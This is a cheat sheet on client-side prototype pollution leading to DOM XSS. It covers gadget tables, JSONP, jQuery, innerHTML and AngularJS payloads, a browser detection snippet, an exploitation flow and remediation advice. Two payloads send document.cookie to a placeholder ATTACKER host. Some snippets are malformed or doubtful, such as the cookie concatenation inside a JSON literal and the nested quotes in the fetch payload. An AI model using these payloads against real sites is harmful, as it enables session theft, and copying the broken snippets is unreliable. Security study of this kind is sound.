# Client-Side Prototype Pollution — DOM XSS

## Summary
In the browser, prototype pollution can modify default properties on all objects, which can be exploited when those properties reach DOM sinks like `innerHTML`, `eval`, `src`, or `location`.

## Gadget Discovery

Common properties that sinks read from objects:

| Sink | Property | Example Gadget |
|------|----------|----------------|
| `innerHTML` | `innerHTML`, `outerHTML` | Pollute `innerHTML` before `document.createElement('div')` |
| `eval` / `Function` | `sourceUrl`, `arguments` | Affects stack trace formatting |
| `document.write` | `innerHTML` | Template rendering |
| `src` (script/img/iframe) | `src`, `href` | Pollute `data-src` fallback |
| `location` | `hash`, `href` | AngularJS `$location` service |

## JSONP Gadget

```javascript
// Many libraries read "callback" from options object
// Pollute Object.prototype.callback before JSONP runs
{
  "__proto__": {
    "callback": "alert(1)"
  }
}
// When library reads options.callback or defaults.callback
// → pollutes into script src
```

## jQuery $$$.extend DOM XSS

```javascript
// If $.extend is used without deep clone:
$.extend(true, {}, attackerPayload);

// Pollute Object.prototype.src to affect dynamically created images
{
  "__proto__": {
    "src": "https://ATTACKER/steal?cookie=" + document.cookie
  }
}
```

## DOM XSS via innerHTML Gadget

```html
<!-- If the app renders a template like: -->
<div id="output"></div>
<script>
  var data = {message: "hello"};
  // Merge happens somewhere
  $.extend(true, data, userInput);
  // Template renders:
  document.getElementById('output').innerHTML = data.message;
</script>

<!-- Attacker pollutes: -->
{
  "__proto__": {
    "innerHTML": "<img src=x onerror=alert(document.domain)>"
  }
}
```

## AngularJS / Vue.js Gadgets

### $onInit / $onChanges (AngularJS 1.x)
```javascript
// AngularJS scopes inherit from Object.prototype
// Pollute $scope.defaults
{
  "__proto__": {
    "$$watchers": [{
      "exp": "alert(1)",
      "fn": "eval"
    }]
  }
}
```

## Detecting PP in the Browser

```javascript
// 1. Add a breakpoint in DevTools Sources
// 2. In Console, pollute:
Object.prototype.alert = "test";

// 3. Interact with the page — look for alerts or console output
// 4. Check if any library code reads the polluted property

// Automated detection:
const targetProp = '__pp_test__';
Object.prototype[targetProp] = 'detected';
setTimeout(() => {
  if ({}.__pp_test__) {
    console.log('PP confirmed: Object.prototype has __pp_test__');
  }
  delete Object.prototype[targetProp];
}, 2000);
```

## Exploitation Flow

```javascript
// 1. Find a deep merge endpoint (often JSON config, settings, or profile update)
// 2. Inject payload via __proto__ or constructor.prototype
const payload = {
  "__proto__": {
    "html": "<img src=x onerror='fetch("https://ATTACKER/"+document.cookie)'>"
  }
};

// 3. Identify which polluted property reaches a DOM sink
// 4. Trigger the sink (navigation, render, click)
```

## Remediation
- Use `Object.create(null)` for all configuration objects
- Sanitise user-controlled keys during JSON parsing via reviver
- Use Content Security Policy to limit script execution
- Disable direct access to `__proto__` via `Object.freeze(Object.prototype)`
